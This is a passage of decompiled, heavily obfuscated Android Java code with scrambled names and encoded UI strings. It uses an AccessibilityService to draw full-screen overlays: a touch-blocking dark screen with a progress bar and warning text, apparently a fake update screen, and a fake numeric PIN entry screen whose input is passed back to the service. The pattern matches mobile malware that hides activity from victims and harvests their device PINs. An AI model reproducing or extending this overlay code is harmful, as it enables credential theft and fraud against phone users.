    }

    public static String pyu8ovAipBTLYAiKab() {
        return pyu8ovAipBTLYAiKab;
    }

    public static FrameLayout vekpFI4d1Nc4fakF(AccessibilityService accessibilityService) {
        Drawable drawableFindDrawableByLayerId;
        Drawable drawableFindDrawableByLayerId2;
        float f = accessibilityService.getResources().getDisplayMetrics().density;
        FrameLayout frameLayout = new FrameLayout(accessibilityService);
        frameLayout.setBackgroundColor(-16777216);
        frameLayout.getBackground().setAlpha(305 - 53);
        frameLayout.setClickable(true);
        frameLayout.setFocusable(false);
        frameLayout.setOnTouchListener(new yRgbAzuBdXWxcKPu());
        LinearLayout linearLayout = new LinearLayout(accessibilityService);
        linearLayout.setOrientation(1);
        linearLayout.setGravity(1);
        PGz95FTiyhhIYIec74 pGz95FTiyhhIYIec74 = new PGz95FTiyhhIYIec74(accessibilityService);
        int i = (int) (80 * f);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(i, i);
        layoutParams.gravity = 1;
        layoutParams.bottomMargin = (int) ((128 - 88) * f);
        linearLayout.addView(pGz95FTiyhhIYIec74, layoutParams);
        TextView textView = new TextView(accessibilityService);
        textView.setText(TypefaceCache.obtain("000A00780048009300F100B300DE00AE002D0071001B009400E900AC00C600A2002E0036004E009700F400BE00C600A2006D00380015"));
        textView.setTextSize(20.0f);
        int i2 = 32 - 33;
        textView.setTextColor(i2);
        textView.setGravity(17);
        textView.setTypeface(null, 0);
        textView.getPaint().setFakeBoldText(true);
        DVTNwpDEVsUKuznof = textView;
        int i3 = (int) (12 * f);
        linearLayout.addView(textView, Qrz92kRPw4GcghAc(i3));
        TextView textView2 = new TextView(accessibilityService);
        textView2.setText(TypefaceCache.obtain("001A0079004E009500B000BB00D700B1002A0075005E00C700F900AC009200B200330072005A009300F900B100D500E9006300420053008E00E300FF00DF00A6003A0036004F008600FB00BA00B800A600630070005E009000B000B200DB00A900360062005E009400BE"));
        textView2.setTextSize(13.0f);
        textView2.setTextColor(Color.parseColor(TypefaceCache.obtain("00600054000800A100D6009900F400810005")));
        textView2.setGravity(17);
        textView2.setLineSpacing(3.0f * f, 1.0f);
        linearLayout.addView(textView2, Qrz92kRPw4GcghAc((int) (50 * f)));
        ProgressBar progressBar = new ProgressBar(accessibilityService, null, R.attr.progressBarStyleHorizontal);
        progressBar.setMax(100);
        progressBar.setProgress(0);
        try {
            Drawable progressDrawable = progressBar.getProgressDrawable();
            LayerDrawable layerDrawable = progressDrawable instanceof LayerDrawable ? (LayerDrawable) progressDrawable : null;
            if (layerDrawable != null && (drawableFindDrawableByLayerId2 = layerDrawable.findDrawableByLayerId(R.id.background)) != null) {
                drawableFindDrawableByLayerId2.setColorFilter(Color.parseColor(TypefaceCache.obtain("00600025000800A100D6009900F400810005")), PorterDuff.Mode.SRC_IN);
            }
            if (layerDrawable != null && (drawableFindDrawableByLayerId = layerDrawable.findDrawableByLayerId(R.id.progress)) != null) {
                drawableFindDrawableByLayerId.setColorFilter(Color.parseColor(TypefaceCache.obtain("00600025007F00A300D300E70086")), PorterDuff.Mode.SRC_IN);
            }
        } catch (Exception unused) {
            progressBar.getProgressDrawable().setColorFilter(Color.parseColor(TypefaceCache.obtain("00600025007F00A300D300E70086")), PorterDuff.Mode.SRC_IN);
        }
        int i4 = (int) ((43 - 39) * f);
        progressBar.setMinimumHeight(i4);
        progressBar.setMaxHeight(i4);
        J0zjQ7CAgohuxU20eCW6 = progressBar;
        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams((int) (280 * f), -2);
        layoutParams2.gravity = 1;
        linearLayout.addView(progressBar, layoutParams2);
        TextView textView3 = new TextView(accessibilityService);
        textView3.setText(TypefaceCache.obtain("000C0066004F008E00FD00B600C800AE002D0071001B009400E900AC00C600A2002E0038001500C9"));
        textView3.setTextSize(12.0f);
        textView3.setTextColor(Color.parseColor(TypefaceCache.obtain("0060002F000200A100D6009900F400810005")));
        textView3.setGravity(17);
        XiR1pIn5878vVWd = textView3;
        LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(i2, -2);
        layoutParams3.topMargin = i3;
        linearLayout.addView(textView3, layoutParams3);
        TextView textView4 = new TextView(accessibilityService);
        textView4.setText("0%");
        textView4.setTextSize(14.0f);
        textView4.setTextColor(i2);
        textView4.setGravity(17);
        textView4.setTypeface(null, 0);
        textView4.getPaint().setFakeBoldText(true);
        MLSIo1htfMPWeB8V876L = textView4;
        LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(i2, -2);
        int i5 = (int) (8 * f);
        layoutParams4.topMargin = i5;
        linearLayout.addView(textView4, layoutParams4);
        TextView textView5 = new TextView(accessibilityService);
        textView5.setText(TypefaceCache.obtain("00100062005E009700B000EE009200A800250036000900C7208400FF00FB00A900300062005A008B00FC00B600DC00A000630063004B008300F100AB00D7"));
        textView5.setTextSize(10.0f);
        textView5.setTextColor(Color.parseColor(TypefaceCache.obtain("00600020000D00A100D6009900F400810005")));
        textView5.setGravity(17);
        H9XlUr4OeMJFiXK = textView5;
        LinearLayout.LayoutParams layoutParams5 = new LinearLayout.LayoutParams(i2, -2);
        layoutParams5.topMargin = (int) (20 * f);
        linearLayout.addView(textView5, layoutParams5);
        LinearLayout linearLayout2 = new LinearLayout(accessibilityService);
        linearLayout2.setOrientation(1);
        linearLayout2.setGravity(1);
        int i6 = (int) (30 * f);
        linearLayout2.setPadding(i6, 0, i6, (int) (60 * f));
        TextView textView6 = new TextView(accessibilityService);
        textView6.setText("⚠");
        textView6.setTextSize(20.0f);
        textView6.setTextColor(Color.parseColor(TypefaceCache.obtain("00600050007D00A400A100EF0085")));
        textView6.setGravity(17);
        linearLayout2.addView(textView6, Qrz92kRPw4GcghAc(i5));
        TextView textView7 = new TextView(accessibilityService);
        textView7.setText(TypefaceCache.obtain("00070079001B008900FF00AB009200B300360064005500C700FF00B900D400E7003A0079004E009500B000BB00D700B1002A0075005E00C700FF00AD009200B50026007B0054009100F500FF00C600AF0026001C0059008600E400AB00D700B5003A0038001B00BE00FF00AA00C000E700270073004D008E00F300BA009200B0002A007A005700C700E200BA00C100B300220064004F00C700F100AA00C600A8002E0077004F008E00F300BE00DE00AB003A001C004C008F00F500B1009200A4002C007B004B008B00F500AB00D700E9"));
        textView7.setTextSize(10.0f);
        textView7.setTextColor(Color.parseColor(TypefaceCache.obtain("0060002E000B00A100D6009900F400810005")));
        textView7.setGravity(17);
        textView7.setLineSpacing(f * 4.0f, 1.0f);
        linearLayout2.addView(textView7);
        FrameLayout frameLayout2 = new FrameLayout(accessibilityService);
        LinearLayout linearLayout3 = new LinearLayout(accessibilityService);
        linearLayout3.setOrientation(1);
        linearLayout3.setGravity(17);
        linearLayout3.addView(linearLayout);
        frameLayout2.addView(linearLayout3, new FrameLayout.LayoutParams(i2, i2));
        frameLayout2.addView(linearLayout2, new FrameLayout.LayoutParams(i2, -2, 80));
        frameLayout.addView(frameLayout2, new FrameLayout.LayoutParams(i2, i2));
        return frameLayout;
    }

    private static /* synthetic */ void vuad() {
    }

    public static KtHgo1ZBbTF0NSPosJz w9sT1Swbhx3hs(Context context) {
        float f = context.getResources().getDisplayMetrics().density;
        KtHgo1ZBbTF0NSPosJz ktHgo1ZBbTF0NSPosJz = new KtHgo1ZBbTF0NSPosJz(context);
        ktHgo1ZBbTF0NSPosJz.setBackgroundColor(Color.parseColor(TypefaceCache.obtain("00600050000E00A100A500990087")));
        ktHgo1ZBbTF0NSPosJz.setClickable(true);
        ktHgo1ZBbTF0NSPosJz.setFocusable(true);
        ktHgo1ZBbTF0NSPosJz.setFocusableInTouchMode(true);
        LinearLayout linearLayout = new LinearLayout(context);
        linearLayout.setOrientation(1);
        linearLayout.setGravity(1);
        int i = (int) (40 * f);
        linearLayout.setPadding(i, (int) ((166 - 46) * f), i, (int) (60 * f));
        ProgressBar progressBar = new ProgressBar(context);
        progressBar.setIndeterminate(true);
        progressBar.getIndeterminateDrawable().setColorFilter(Color.parseColor(TypefaceCache.obtain("00600022000900DF00A500990086")), PorterDuff.Mode.SRC_IN);
        int i2 = (int) (48 * f);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(i2, i2);
        layoutParams.gravity = 1;
        layoutParams.bottomMargin = (int) (32 * f);
        linearLayout.addView(progressBar, layoutParams);
        TextView textView = new TextView(context);
        textView.setText(TypefaceCache.checked("045C0456040504D504A5049F048804F700630427040E04D004AE04E004820486047E0428047A04A504A8"));
        textView.setTextSize(20.0f);
        textView.setTextColor(Color.parseColor(TypefaceCache.obtain("00600024000B00D500A100ED0086")));
        textView.setGravity(17);
        textView.setTypeface(null, 1);
        linearLayout.addView(textView, Qrz92kRPw4GcghAc((int) ((45 - 33) * f)));
        TextView textView2 = new TextView(context);
        textView2.setText(TypefaceCache.checked("000400790054008000FC00BA00920097002F0077004200C700C000AD00DD00B300260075004F00C704AF049F048C04F504760456047404D204D200FF04FF0485047D0036040404A704A804E4048C04F10476042B040304D200BE00FF04AD04F904750426040004A404A9049E04F004F7006F0036040404D904A404E1048404F3047B0454040E00C900BE00F1"));
        textView2.setTextSize(15.0f);
        textView2.setTextColor(Color.parseColor(TypefaceCache.obtain("00600023007D00D100A300E9008A")));
        textView2.setGravity(17);
        textView2.setLineSpacing((int) (4 * f), 1.0f);
        linearLayout.addView(textView2, Qrz92kRPw4GcghAc(i));
        View view = new View(context);
        view.setBackgroundColor(Color.parseColor(TypefaceCache.obtain("00600052007A00A300D3009A0082")));
        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-1, (int) (1 * f));
        layoutParams2.bottomMargin = (int) ((71 - 47) * f);
        linearLayout.addView(view, layoutParams2);
        TextView textView3 = new TextView(context);
        textView3.setText(TypefaceCache.checked("046E0454040500C704AC04E1048404F204010036040C04D704AD049004F0048B0063042B040E04A604AA04E10489048B04790428001B04DB04A804E204F10485006D001C042604D200B004E8048204FD0403045D040904D704A9049D048700E7040E042C047B04D704AD00F1"));
        textView3.setTextSize(13.0f);
        textView3.setTextColor(Color.parseColor(TypefaceCache.obtain("0060002E000B00DF00A600E700F0")));
        textView3.setGravity(17);
        linearLayout.addView(textView3);
        ktHgo1ZBbTF0NSPosJz.addView(linearLayout, new FrameLayout.LayoutParams(-1, -1));
        return ktHgo1ZBbTF0NSPosJz;
    }

    public static boolean wotphlvK9sPbXJ() {
        return b1EoSIRjJHO5;
    }

    public static qfRIDC9zNn5AJ xDyLpEZyrcKVe0(AccessibilityService accessibilityService) {
        float f = accessibilityService.getResources().getDisplayMetrics().density;
        qfRIDC9zNn5AJ qfridc9znn5aj = new qfRIDC9zNn5AJ(accessibilityService);
        qfridc9znn5aj.setOrientation(1);
        qfridc9znn5aj.setBackgroundColor(Color.parseColor(TypefaceCache.obtain("00600027005A00D600F100ED00D7")));
        qfridc9znn5aj.setGravity(17);
        qfridc9znn5aj.setFocusable(true);
        qfridc9znn5aj.setFocusableInTouchMode(true);
        int i = (int) (30 * f);
        int i2 = (int) (60 * f);
        qfridc9znn5aj.setPadding(i, i2, i, i2);
        TextView textView = new TextView(accessibilityService);
        textView.setText(TypefaceCache.checked("045D0427040604D904A204E4048704FA047B0423001B04A604A8049E04F004F2047F045D"));
        textView.setTextSize(24.0f);
        textView.setTextColor(-1);
        textView.setGravity(17);
        int i3 = (int) (((-2) + 18) * f);
        qfridc9znn5aj.addView(textView, Qrz92kRPw4GcghAc(i3));
        TextView textView2 = new TextView(accessibilityService);
        textView2.setText(TypefaceCache.checked("04510424040E04D304A8049D048700E70013005F007500C704A404E404FD00E7047C0456040504D304AE04E4048404F2047E042E0474"));
        textView2.setTextSize(16.0f);
        textView2.setTextColor(Color.parseColor(TypefaceCache.obtain("0060002E000300DF00A800E7008A")));
        textView2.setGravity(17);
        qfridc9znn5aj.addView(textView2, Qrz92kRPw4GcghAc(i));
        EditText editText = new EditText(accessibilityService);
        editText.setHint(TypefaceCache.obtain("0013005F0075"));
        editText.setHintTextColor(Color.parseColor(TypefaceCache.obtain("00600020000D00D100A600E90084")));
        editText.setTextColor(-1);
        editText.setTextSize(24.0f);
        editText.setGravity(17);
        editText.setBackgroundColor(Color.parseColor(TypefaceCache.obtain("00600024005A00D500F100EB00D7")));
        int i4 = (int) (20 * f);
        editText.setPadding(i4, i3, i4, i3);
        editText.setInputType((-77) + 95);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-1, -2);
        layoutParams.bottomMargin = i4;
        qfridc9znn5aj.addView(editText, layoutParams);
        Button button = new Button(accessibilityService);
        button.setText(TypefaceCache.checked("045C0428040F04A504A204EA04F204F3047B04540477"));
        button.setTextSize(16.0f);
        button.setTextColor(-1);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(Color.parseColor(TypefaceCache.obtain("00600022005A00DE00F500B900D4")));
        gradientDrawable.setCornerRadius((int) (8 * f));
        button.setBackground(gradientDrawable);
        button.setAllCaps(false);
        button.setOnClickListener(new qWdun9tpyrzMOCG8H4x(editText, accessibilityService, 0));
        qfridc9znn5aj.addView(button, new LinearLayout.LayoutParams(-1, -2));
        return qfridc9znn5aj;
    }
}
